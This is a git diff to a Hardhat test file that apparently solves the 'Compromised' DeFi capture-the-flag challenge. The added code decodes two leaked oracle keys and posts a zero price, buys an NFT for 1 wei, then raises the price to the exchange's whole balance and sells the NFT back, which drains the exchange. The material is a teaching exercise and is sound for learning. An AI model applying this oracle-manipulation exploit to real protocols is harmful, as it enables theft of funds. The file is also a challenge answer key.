@@ -1,6 +1,7 @@
 import { expect } from 'chai';
 import { ethers } from 'hardhat';
 import { setBalance } from '@nomicfoundation/hardhat-network-helpers';
+import { encodedKey1, encodedKey2 } from './EncodedKeys.json';
 
 describe('Compromised challenge', function () {
   it('should obtain all ETH available in the exchange', async function () {
@@ -20,12 +21,12 @@ describe('Compromised challenge', function () {
 
     // Initialize balance of the trusted source addresses
     for (let i = 0; i < sources.length; i++) {
-      setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
+      await setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
       expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
     }
 
     // Player starts with limited balance
-    setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
     expect(await ethers.provider.getBalance(player)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
 
     // Deploy the oracle and setup the trusted sources with initial prices
@@ -34,19 +35,39 @@ describe('Compromised challenge', function () {
       [sources, ['DVNFT', 'DVNFT', 'DVNFT'], [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]],
       deployer
     );
-    const oracle = await ethers.getContractAt('TrustfulOracle', oracleInitializer, deployer);
+    const oracle = await ethers.getContractAt('TrustfulOracle', await oracleInitializer.oracle(), deployer);
 
     // Deploy the exchange and get an instance to the associated ERC721 token
-    const exchange = await ethers.deployContract(
-      'Exchange',
-      [oracle, { value: EXCHANGE_INITIAL_ETH_BALANCE }],
-      deployer
-    );
+    const exchangeFactory = await ethers.getContractFactory('Exchange', deployer);
+    const exchange = await exchangeFactory.deploy(oracle, { value: EXCHANGE_INITIAL_ETH_BALANCE });
+
     const nftToken = await ethers.getContractAt('DamnValuableNFT', await exchange.token(), deployer);
     expect(await nftToken.owner()).to.equal(ethers.ZeroAddress); // ownership renounced
     expect(await nftToken.rolesOf(exchange)).to.eq(await nftToken.MINTER_ROLE());
 
     /** CODE YOUR SOLUTION HERE */
+    function decode(data: string) {
+      data = ethers.toUtf8String('0x' + data.replace(/ /g, ''));
+      return ethers.toUtf8String(ethers.decodeBase64(data));
+    }
+
+    const privateKey1 = decode(encodedKey1);
+    const privateKey2 = decode(encodedKey2);
+
+    const trustedSource1 = new ethers.Wallet(privateKey1, ethers.provider);
+    const trustedSource2 = new ethers.Wallet(privateKey2, ethers.provider);
+
+    // Manipulate the price of the NFT to be bought
+    await oracle.connect(trustedSource1).postPrice('DVNFT', 0);
+    await oracle.connect(trustedSource2).postPrice('DVNFT', 0);
+
+    await exchange.connect(player).buyOne({ value: 1 });
+
+    await oracle.connect(trustedSource1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+    await oracle.connect(trustedSource2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+
+    await nftToken.connect(player).approve(exchange, 0);
+    await exchange.connect(player).sellOne(0);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
